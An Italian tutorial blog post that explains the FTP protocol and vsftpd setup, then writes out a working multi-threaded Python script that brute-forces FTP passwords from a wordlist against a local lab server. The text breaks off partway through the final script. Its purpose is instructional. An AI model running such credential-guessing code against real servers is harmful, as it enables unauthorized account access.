 Basi sul Protocollo FTP Configurazione di un Server FTP con Vsftpd Brute Forcing delle credenziali di un server FTP con Python Prova sul Campo   In questo post andrò a spiegare come è possibile creare uno script per fare il brute forcing delle credenziali (in particolare la password) di un server FTP. Prima di tutto facciamo chiarezza su cos&amp;rsquo;è il protocollo FTP.
Basi sul Protocollo FTP Ftp è l’acronimo di File Transfer Protocol esso è un protocollo che permette di trasferire un file dalla rete al singolo client (server) e viceversa, esso però permette anche la navigazione veloce nella struttura di un server web dove sono presenti file.</description>
      <content>&lt;p&gt;&lt;strong&gt;Table Of Contents&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#basi-sul-protocollo-ftp&#34;&gt;Basi sul Protocollo FTP&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#configurazione-di-un-server-ftp-con-vsftpd&#34;&gt;Configurazione di un Server FTP con Vsftpd&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#brute-forcing-delle-credenziali-di-un-server-ftp-con-python&#34;&gt;Brute Forcing delle credenziali di un server FTP con Python&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#prova-sul-campo&#34;&gt;Prova sul Campo&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;In questo post andrò a spiegare come è possibile creare uno script per fare il brute forcing delle credenziali (in particolare la password) di un server FTP. Prima di tutto facciamo chiarezza su cos&amp;rsquo;è il protocollo FTP.&lt;/p&gt;
&lt;h1 id=&#34;basi-sul-protocollo-ftp&#34;&gt;Basi sul Protocollo FTP&lt;/h1&gt;
&lt;p&gt;Ftp è l’acronimo di File Transfer Protocol esso è un protocollo che permette di trasferire un file dalla rete al singolo client (server) e viceversa, esso però permette anche la navigazione veloce nella struttura di un server web dove sono presenti file. É uno dei protocolli più vecchi di Internet. Già a partire dal 1974 si inizia a lavorare con la tecnologia di trasmissione dei file completi. Nel 1985 si definisce con esattezza il FTP nel documento Request For Comments 959. Il protocollo ftp è un protocollo indipendente quindi è possibile usarlo su qualsiasi computer, indipendentemente dal sistema operativo che vi si usa. Questo servizio viene usato anche nella posta odierna, questo perché, anche essendo un protocollo datato permette il trasferimento di file di notevoli dimensioni. C’è una distinzione da fare tra ftp pubblico e ftp privato:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;ftp pubblico&lt;/strong&gt;: viene definito tale quando un client esegue il download su un sito web, o su un qualsiasi sito che permette di scaricare file durante la navigazione in questo caso può essere chiamato anche anonymous ftp.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;ftp privato&lt;/strong&gt;: se ad esempio un provider mette a disposizione uno spazio web, directory comprese per fare il download e upload dei file html esso viene definito ftp privato o full service ftp.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Il File Transfer Protocol viene eseguito all’interno del livello applicativo dello stack TCP/IP, ossia nello stesso livello di HTTP o POP. Questi protocolli si caratterizzano per il loro funzionamento in combinazione con i programmi, come browser o client di posta elettronica, grazie ai quali svolgono la propria funzione. Anche per il File Transfer Protocol esistono dei software FTP dedicati.
Per stabilire una connessione FTP vengono aperti due canali. Per prima cosa client e server creano un canale di controllo tramite la porta 21, tramite il quale il client invia comandi al server e questo risponde con i codici di stato. Dopodiché entrambi possono creare un canale dati che trasporta i file desiderati da una parte all’altra. Il protocollo controlla eventuali errori.&lt;/p&gt;
&lt;p&gt;È necessario distinguere però tra FTP attivo e passivo. Nella variante attiva è il client a stabilire la connessione, come spiegato, attraverso la porta 21 e a comunicare al server su quale porta lato cliente questo può inviare la propria risposta. Ma se il client è protetto da un firewall, allora il server non potrà inviare alcuna risposta in quanto tutte le connessioni esterne sono bloccate. Proprio per questi casi è stata sviluppata una modalità passiva, che prevede che sia il server a rendere nota la porta tramite la quale il client può creare il canale dati. In questo modo, essendo il client a iniziare la connessione, il firewall non blocca il trasferimento dei dati.
Il File Transfer Protocol dispone di vari comandi e codici di stato. Grazie a ben 32 comandi totali - non sempre necessariamente tutti implementati dal server - il client istruisce il server su qual è l’operazione desiderata:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;caricare o scaricare file&lt;/li&gt;
&lt;li&gt;organizzare cartelle&lt;/li&gt;
&lt;li&gt;cancellare file&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Il server risponde ogni volta con un codice di stato che serve a informare se il comando può essere eseguito o meno con successo.
Il File Transfer Protocol originale venne creato senza misure di sicurezza preventive. All’epoca Internet era ancora molto piccolo e la cybercriminalità non esisteva ancora. Ma col passare del tempo i rischi di sicurezza associati all’utilizzo del FTP sono diventati numerosi, venendo le informazioni trasmesse senza essere state precedentemente criptate.&lt;/p&gt;
&lt;p&gt;Perciò sono state sviluppate due varianti sicure, che da allora continuano a farsi concorrenza: FTPS e SFTP. La prima variante consiste nel FTP over SSL. La connessione viene stabilita utilizzando i Secure Socket Layers (SSL), ossia il Transport Layer Security (TLS), che serve a criptare lo scambio di dati.&lt;br&gt;
Il SSH File Transfer Protocol (SFTP), al contrario, utilizza il Secure Shell (SSH) per garantire una trasmissione sicura dei dati.&lt;/p&gt;
&lt;p&gt;Anche in questo caso la connessione è criptata. Ma mentre il FTPS necessita di due connessioni, al SFTP ne basta una sola. In compenso però bisogna utilizzare un programma aggiuntivo.
Vsftpd (acronimo di Very Secure FTP daemon) è un server FTP per sistemi simili a Unix, incluso Linux. È il server FTP predefinito nelle distribuzioni Linux Ubuntu, CentOS, Fedora, NimbleX, Slackware e RHEL. È concesso in licenza con GNU General Public License, supporta IPv6, TLS e FTPS.&lt;/p&gt;
&lt;p&gt;Ora che abbiamo compreso cos&amp;rsquo;è il protocollo FTP e a cosa serve, andiamo a vedere come configurare un server FTP con Linux.&lt;/p&gt;
&lt;h1 id=&#34;configurazione-di-un-server-ftp-con-vsftpd&#34;&gt;Configurazione di un Server FTP con Vsftpd&lt;/h1&gt;
&lt;p&gt;Il pacchetto vsftpd è disponibile nei repository standard. Esegui i seguenti comandi per installarlo:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ sudo apt update
$ sudo apt install vsftpd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Al termine dell&amp;rsquo;installazione, il servizio ftp verrà avviato automaticamente.  Stampa lo stato del servizio per confermare:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ sudo systemctl status vsftpd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;È possibile configurare il server vsftpd modificando il file &lt;code&gt;/etc/vsftpd.conf&lt;/code&gt;. Il file di configurazione contiene la documentazione dettagliata per la maggior parte delle impostazioni. Visita la pagina ufficiale vsftpd per vedere tutte le opzioni disponibili.
Per iniziare, apri il file di configurazione vsftpd:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ sudo nano /etc/vsftpd.conf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Per assicurarti che solo gli utenti locali possano connettersi al server FTP, cerca le direttive anonymous_enable e local_enable e assicurati che le tue impostazioni corrispondano alle seguenti righe:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;anonymous_enable&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;NO
local_enable&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;YES
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Creeremo un nuovo utente per testare il server FTP. Crea un nuovo utente chiamato newftpuser:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo adduser newftpuser
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Impostare la password utente quando richiesto. Aggiungere l&amp;rsquo;utente all&amp;rsquo;elenco degli utenti FTP consentiti:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;newftpuser&amp;#34;&lt;/span&gt; | sudo tee -a /etc/vsftpd.user_list
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Crea l&amp;rsquo;albero della directory FTP e imposta le autorizzazioni corrette:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ sudo mkdir -p /home/newftpuser/ftp/upload
$ sudo chmod &lt;span style=&#34;color:#ae81ff&#34;&gt;550&lt;/span&gt; /home/newftpuser/ftp
$ sudo chmod &lt;span style=&#34;color:#ae81ff&#34;&gt;750&lt;/span&gt; /home/newftpuser/ftp/upload
$ sudo chown -R newftpuser: /home/newftpuser/ftp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Per il nostro fine vanno bene queste configurazioni, ma il file &lt;code&gt;/etc/vsftpd.conf&lt;/code&gt; ne ha moltre altre, quindi invito chi fosse interessato ad approfondire meglio l&amp;rsquo;argomento.&lt;/p&gt;
&lt;h1 id=&#34;brute-forcing-delle-credenziali-di-un-server-ftp-con-python&#34;&gt;Brute Forcing delle credenziali di un server FTP con Python&lt;/h1&gt;
&lt;p&gt;Useremo il modulo ftplib integrato in Python. Tuttavia, useremo colorama per stampare a colori in Python:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;pip3 install colorama
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Inizia a scrivere il codice:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; ftplib
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; colorama &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Fore, init &lt;span style=&#34;color:#75715e&#34;&gt;# for fancy colors, nothing else&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# init the console for colors (Windows)&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# init()&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# hostname or IP address of the FTP server&lt;/span&gt;
host &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;192.168.1.113&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# username of the FTP server, root as default for linux&lt;/span&gt;
user &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# port of FTP, aka 21&lt;/span&gt;
port &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Quindi il server locale si trova a 192.168.1.113, ho creato anche un nome utente &amp;ldquo;test&amp;rdquo;, e poi specifichiamo la porta dell&amp;rsquo;FTP, che è la 21.&lt;/p&gt;
&lt;p&gt;Ora scriviamo la funzione principale che accetta una password negli argomenti e restituisce se le credenziali sono corrette:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;is_correct&lt;/span&gt;(password):
    &lt;span style=&#34;color:#75715e&#34;&gt;# initialize the FTP server object&lt;/span&gt;
    server &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ftplib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;FTP()
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!] Trying&amp;#34;&lt;/span&gt;, password)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
        &lt;span style=&#34;color:#75715e&#34;&gt;# tries to connect to FTP server with a timeout of 5&lt;/span&gt;
        server&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect(host, port, timeout&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
        &lt;span style=&#34;color:#75715e&#34;&gt;# login using the credentials (user &amp;amp; password)&lt;/span&gt;
        server&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;login(user, password)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; ftplib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;error_perm:
        &lt;span style=&#34;color:#75715e&#34;&gt;# login failed, wrong credentials&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
        &lt;span style=&#34;color:#75715e&#34;&gt;# correct credentials&lt;/span&gt;
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Fore&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GREEN&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[+] Found credentials:&amp;#34;&lt;/span&gt;, password, Fore&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;RESET)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Niente di speciale; inizializziamo l&amp;rsquo;oggetto server FTP usando ftplib.FTP() e poi ci connettiamo a quell&amp;rsquo;host e proviamo ad accedere, questo solleverà un&amp;rsquo;eccezione ogni volta che le credenziali non sono corrette, quindi se viene sollevata, restituiremo solo False e True altrimenti.&lt;/p&gt;
&lt;p&gt;Useremo un elenco di password conosciute. Sentiti libero di usarne uno qualsiasi, oppure puoi generare il tuo elenco di parole personalizzato usando Crunch. Tuttavia, utilizzeremo l&amp;rsquo;elenco delle password di Nmap che contiene circa 5000 password. Se sei su Kali Linux, si trova in &amp;ldquo;/usr/share/wordlists/nmap.lst&amp;rdquo;. Altrimenti, prendilo &lt;a href=&#34;https://github.com/x4nth055/pythoncode-tutorials/blob/master/ethical-hacking/ftp-cracker/wordlist.txt&#34;&gt;qui&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Una volta che lo hai, mettilo nella directory corrente e chiamalo wordlist.txt e usa il seguente codice:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# read the wordlist of passwords&lt;/span&gt;
passwords &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;wordlist.txt&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] Passwords to try:&amp;#34;&lt;/span&gt;, len(passwords))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ora tutto ciò che dobbiamo fare è eseguire la funzione di cui sopra su tutte queste password:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# iterate over passwords one by one&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# if the password is found, break out of the loop&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; password &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; passwords:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; is_correct(password):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ora, questo codice va bene, ma è molto lento. Utilizza un solo thread che tenta in sequenza una connessione FTP su ciascuna password.&lt;/p&gt;
&lt;p&gt;Usiamo i thread per accelerare questo processo; il seguente codice è quello completo che utilizza il multi-threading:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; ftplib
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; threading &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Thread
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; queue
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; colorama &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Fore, init &lt;span style=&#34;color:#75715e&#34;&gt;# for fancy colors, nothing else&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# init the console for colors (for Windows)&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# init()&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# initialize the queue&lt;/span&gt;
q &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; queue&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Queue()
&lt;span style=&#34;color:#75715e&#34;&gt;# number of threads to spawn&lt;/span&gt;
n_threads &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# hostname or IP address of the FTP server&lt;/span&gt;
host &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;192.168.1.113&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# username of the FTP server, root as default for linux&lt;/span&gt;
user &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# port of FTP, aka 21&lt;/span&gt;
port &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;connect_ftp&lt;/span&gt;():
    &lt;span style=&#34;color:#66d9ef&#34;&gt;global&lt;/span&gt; q
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
        &lt;span style=&#34;color:#75715e&#34;&gt;# get the password from the queue&lt;/span&gt;
        password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get()
        &lt;span style=&#34;color:#75715e&#34;&gt;# initialize the FTP server object&lt;/span&gt;
        server &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ftplib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;FTP()
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!] Trying&amp;#34;&lt;/span&gt;, password)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
            &lt;span style=&#34;color:#75715e&#34;&gt;# tries to connect to FTP server with a timeout of 5&lt;/span&gt;
            server&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect(host, port, timeout&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
            &lt;span style=&#34;color:#75715e&#34;&gt;# login using the credentials (user &amp;amp; password)&lt;/span&gt;
            server&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;login(user, password)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; ftplib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;error_perm:
            &lt;span style=&#34;color:#75715e&#34;&gt;# login failed, wrong credentials&lt;/span&gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            &lt;span style=&#34;color:#75715e&#34;&gt;# correct credentials&lt;/span&gt;
            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Fore&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GREEN&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[+] Found credentials: &amp;#34;&lt;/span&gt;)
            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Host: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;host&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;User: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;user&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Password: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;password&lt;span style=&#34;color:#e6db74&#34;&gt;}{&lt;/span&gt;Fore&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;RESET&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
            &lt;span style=&#34;color:#75715e&#34;&gt;# we found the password, let&amp;#39;s clear the queue&lt;/span&gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mutex:
                q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;queue&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;clear()
                q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;all_tasks_done&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;notify_all()
                q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;unfinished_tasks &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;finally&lt;/span&gt;:
            &lt;span style=&#34;color:#75715e&#34;&gt;# notify the queue that the task is completed for this password&lt;/span&gt;
            q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;task_done()

&lt;span style=&#34;color:#75715e&#34;&gt;# read the wordlist of passwords&lt;/span&gt;
passwords &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;wordlist.txt&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] Passwords to try:&amp;#34;&lt;/span&gt;, len(passwords))
&lt;span style=&#34;color:#75715e&#34;&gt;# put all passwords to the queue&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; password &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; passwords:
    q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;put(password)
&lt;span style=&#34;color:#75715e&#34;&gt;# create `n_threads` that runs that function&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; t &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(n_threads):
    thread &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Thread(target&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;connect_ftp)
    &lt;span style=&#34;color:#75715e&#34;&gt;# will end when the main thread end&lt;/span&gt;
    thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;daemon &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
    thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;start()
&lt;span style=&#34;color:#75715e&#34;&gt;# wait for the queue to be empty&lt;/span&gt;
